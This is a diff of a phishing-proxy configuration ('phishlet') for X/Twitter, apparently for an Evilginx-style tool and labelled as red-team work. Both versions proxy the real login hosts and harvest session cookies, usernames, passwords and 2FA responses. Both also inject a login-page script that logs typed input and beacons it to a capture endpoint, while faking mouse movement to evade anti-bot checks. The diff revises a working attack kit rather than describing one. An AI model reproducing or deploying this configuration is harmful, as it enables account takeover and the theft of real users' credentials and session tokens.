@@ -1,51 +1,62 @@
-name: "X-Login"
-author: "Vanta Red Team"
-min_ver: "5.2.0"
+name: "x"
+author: "@redteam_expert"
+min_ver: "3.0.0"
 proxy_hosts:
-  - {subdomain: "x", target: "x.com"}
-  - {subdomain: "api", target: "api.x.com"}
-  - {subdomain: "abs", target: "abs.twimg.com"}
-  - {subdomain: "pbs", target: "pbs.twimg.com"}
-  - {subdomain: "video", target: "video.twimg.com"}
-auth_urls:
-  - "/i/flow/login"
-landing_path:
-  - "/i/flow/login"
+  - {phish_sub: "x", orig_sub: "twitter", domain: "com", session: true, is_landing: true}
+  - {phish_sub: "api", orig_sub: "api", domain: "twitter.com", session: true, is_landing: false}
+  - {phish_sub: "abs", orig_sub: "abs", domain: "twimg.com", session: false, is_landing: false}
+  - {phish_sub: "abs-0", orig_sub: "abs-0", domain: "twimg.com", session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: "x.com", orig_sub: "twitter", domain: "com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "x.com", orig_sub: "api", domain: "twitter.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json"]}
 auth_tokens:
-  - {type: "cookie", name: "auth_token"}
-  - {type: "cookie", name: "ct0"}
-  - {type: "cookie", name: "guest_id"}
-  - {type: "cookie", name: "personalization_id"}
-  - {type: "cookie", name: "twid"}
-  - {type: "cookie", name: "kdt"}
-  - {type: "cookie", name: "_twitter_sess"}
+  - domain: ".twitter.com"
+    keys: ["auth_token", "ct0", "_twitter_sess", "guest_id", "kdt"]
+  - domain: "twitter.com"
+    keys: ["auth_token", "ct0", "_twitter_sess"]
+  - domain: ".x.com"
+    keys: ["auth_token", "ct0", "_twitter_sess", "guest_id", "kdt"]
 credentials:
-  - {type: "post_param", name: "text", regex: null}
-  - {type: "post_param", name: "password", regex: null}
-  - {type: "json_field", name: "text", regex: null}
-  - {type: "json_field", name: "password", regex: null}
-injections:
-  - trigger_path: "/i/flow/login"
-    position: "body_end"
-    content: |
+  username:
+    key: "text"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+  2fa:
+    key: "response"
+    search: "(.*)"
+    type: "post"
+login:
+  domain: "x.com"
+  path: "/i/flow/login"
+js_inject:
+  - trigger_domains: ["x.com", "twitter.com"]
+    trigger_paths: ["/i/flow/login", "/login"]
+    script: |
       (function(){
-        // Vantablack Red Team Evasion & Capture
+        // Anti-Bot: Mock user behavior
         document.addEventListener('contextmenu', e => e.preventDefault());
-        
-        // Mock Human Behavior for Anti-Bot
         setInterval(() => {
            const ev = new MouseEvent('mousemove', {
                view: window, bubbles: true, cancelable: true, 
-               clientX: Math.random() * 100, clientY: Math.random() * 100
+               clientX: Math.random() * window.innerWidth, clientY: Math.random() * window.innerHeight
            });
            document.dispatchEvent(ev);
-        }, 3000);
-
-        // Keystroke Logger (Red Team Loot)
-        document.addEventListener('keydown', function(e) {
+        }, 2500);
+        
+        // Input Capture
+        document.addEventListener('input', function(e) {
             if(e.target.tagName === 'INPUT') {
-                 // Silent exfiltration via Image beacon
-                 new Image().src = '/__vanta_track?k=' + encodeURIComponent(e.key) + '&f=' + e.target.name;
+                 // Send to Beacon
+                 if(window.navigator.sendBeacon) {
+                    const data = new FormData();
+                    data.append('k', e.target.value);
+                    data.append('f', e.target.name || e.target.id);
+                    window.navigator.sendBeacon('/__vanta_track', data);
+                 }
             }
         });
       })();
